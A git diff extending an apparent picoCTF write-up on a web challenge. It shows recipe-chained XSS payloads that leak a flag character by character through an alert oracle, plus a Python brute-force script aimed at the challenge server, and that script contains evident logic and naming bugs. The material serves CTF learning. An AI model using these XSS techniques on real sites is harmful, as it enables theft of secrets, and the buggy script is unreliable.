@@ -780,7 +780,7 @@ So, when we run node on the ```index.mjs``` file we can navigate to the url ```h
 
 ![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/b5524ae3-8480-40e3-8784-bad688763f70)
 
-This is more of a conditional statement, if the pathname is ```/``` the ```content-type``` header is set to ```text/html```, if the pathname is ```/index.js``` the ```content-type``` is set to ```text/javascript```. Lastly, if the pathname is ```/remoteCraft```, the code parses a URL search parameter named recipe and extracting two variables, recipe and xss. It then performs several assertions to validate the input:
+This is more of a conditional statement, if the pathname is ```/``` the ```content-type``` header is set to ```text/html```, if the pathname is ```/index.js``` the ```content-type``` is set to ```text/javascript```. Lastly, if the pathname is ```/remoteCraft```, the code parses a URL search parameter named recipe and extracting two variables, "recipe" and "xss". It then performs several assertions to validate the input:
 ```
 assert(typeof xss === 'string'): This checks that xss is a string.
 assert(xss.length < 300): This checks that the length of xss is less than 300 characters.
@@ -817,6 +817,140 @@ command:```node index.mjs```
 
 ![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/30309d42-f1d5-41a5-bc93-15375836c4b4)
 
+We can navigate to the url ```http://127.0.0.1:8080``` on the chromum browser
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2652b957-b453-4970-b81f-ca7d76bdda1f)
+
+We have 4 elements here, what happens when we mix fire and water??
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/088f27c1-9c90-48ee-b531-3a747ac81c16)
+
+So ```fire + water = steam```, how about air and water??
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/89a75b29-ca70-42ac-9969-27e8ceb1fd17)
+
+So, ```air + water = mist```, now this means those 4 elements are the base recipes, so it's safe to say every other recipes are being formed from these base recipes. Now, if you check the index.js file you'll see that the ```xss = exploit + web design```
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/a299f4e4-86a6-4b8e-9ee5-39f7ee18afa5)
+
+But then then ```exploit``` also has recipes it's produced from. So, to get the right recipe we have to get the base recipes right.
+
+When you try to get the base recipes for xss, you should have something like this
+
+```
+[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]]
+```
+Now, we've explained conditions to meet if we want to execute xss, you can check the explanation for this above. So at the end of the day we can craft this payload
+
+```
+/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"alert(1)"}
+```
+So, if the recipes are right we get a message that says "visiting", also our xss query gets executed, but if the recipes aren't right we get an "invalid recipe" message
+
+Lets try this
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/64a909a6-3c4a-4c57-a081-011165f2244a)
+
+The moment we got the "visiting" message, another chromium instance popped up executing the xss query.
+
+Now, the question is, how do we exfiltrate data with this??
+
+I mean this was the part where nyself and my teammates got stuck. We thought of webrtc, but then webrtc was disabled on the chromium browser so that wasn't possible. We could have used the ```fetch()``` function though but we can't because of the ```connect-src``` in the csp header which limits the domian we connect to or websockets. We were stuck here for days trying to bypass csp hehe
+
+But then we tried something else, how about instead of trying to exfiltrate all the data at once we kind of just check the server for each characters and then we try to make an event happen if the character is present. 
+
+If you are familiar with Blind SQL injection with conditional responses you'll understand what I'm trying to say, for Blind SQL injection you get a response when your query is true. We'll be using the same approach here.
+
+Lets craft a payload like this
+
+```
+/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"if (JSON.parse(atob(window.location.hash.slice(1))).flag[0] == 'p'){alert(1);}"}
+```
+Now, what this does is that, if the recipes are correct it gives us the "visiting" message and then spawns another chromium instance, if the first character of the flag property in the json object is "p" is present the ```alert``` statement gets executed, if the first character isn't "p", the ```alert``` statement doesn't get executed
+
+Lets try this
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/41301228-cf0d-4805-ae30-044bc1aeb50a)
+
+The alert statement got executed which means the character "p" is the first character, lets change the character to say "Q"
+
+```
+/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"if (JSON.parse(atob(window.location.hash.slice(1))).flag[0] == 'q'){alert(1);}"}
+```
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/cf01e480-0f76-4c55-8486-9719f96befca)
+
+Well, the alert statement didn't get executed which means the character "q" isn't the first character of the flag propert
+
+It was easier to test this method here since we know  the fake flag to be ```picoCTF{test_flag}```, so you can confirm if these characters are in the flag property using that query. From the fake flag we know the 10th index in the flag property has the "s" character, lets confirm this with our query
+
+```
+/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"if (JSON.parse(atob(window.location.hash.slice(1))).flag[10] == 's'){alert(1);}"}
+```
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/79a40108-dbb5-43b4-b3c5-5ba3c423cfca)
+
+Yeah, the query works😎
+
+Now, how do we test this on the challenge instance??
+
+The challenge instance doesn't spawn a chromium browser even if our recipe is correct, all we get is just the "visiting" message. So in this case we won't be able to tell if a character is in the flag property or not because we don't know if our alert statement is getting executed or not.
+
+So we came up with something else, my teammate wrote a python script
+
+```python
+import requests
+import json
+import string
+
+def search():
+    # binary search algo implementation
+    pass
+
+def doxss(xss):
+    return json.dumps({
+    "recipe": [['Water', 'Earth'], ['Water', 'Air'], ['Mist', 'Fire'], ['Mud', 'Fog'], ['Fire', 'Earth'], ['Magma', 'Mud'], ['Obsidian', 'Water'], ['Sludge', 'Hot Spring'], ['Steam Engine', 'Fire'], ['Earth', 'Air'], ['Heat Engine', 'Dust'], ['Sand', 'Fire'], ['Obsidian', 'Earth'], ['Hot Spring', 'Steam Engine'], ['Computer Chip', 'Electricity'], ['Glass', 'Software'], ['Computer Chip', 'Steam Engine'], ['Computer Chip', 'Fire'], ['Artificial Intelligence', 'Data'], ['Software', 'Encryption'], ['Vulnerability', 'Cybersecurity'], ['Electricity', 'Software'], ['Magma', 'Mist'], ['Rock', 'Air'], ['Program', 'Internet'], ['Exploit', 'Web Design']],
+    "xss": xss})
+
+flag = "picoCTF{"
+idx = 10
+url = 'http://rhea.picoctf.net:64687/remoteCraft'
+# url = 'http://rhea.picoctf.net:61582/remoteCraft'
+
+charset = string.printable
+
+while True:
+    print(f"Flag: {flag}")
+    for string in charset:
+        print(f"Trying: {flag + string}")
+
+        isFound = False
+        chr = string
+        xss = "if (JSON.parse(atob(window.location.hash.slice(1))).flag[" + str(idx) + "] == " + "'" + string + "'" +"){document.body.innerHTML+=`<iframe srcdoc=\"<script src='${location.origin}//'>\"></iframe>`;};"
+        print(xss)
+        cnt = 0
+
+        while cnt <= 15:
+            try:
+                full = f"{url}?recipe={requests.utils.quote(doxss(xss))}"
+                requests.get(full)    
+            except ConnectionRefusedError:
+                flag += charset[charset.index(string)-1]
+                idx += 1
+                cnt = 15
+                is_Found = True
+                continue
+
+            if isFound:
+                break
+
+            cnt += 1
+            
+        # print(f"[Counter: {cnt}, isFound: {isFound}]")
+
+    if len(flag) != 0 and flag[-1] != '}':
+        break
+```
 
 
 
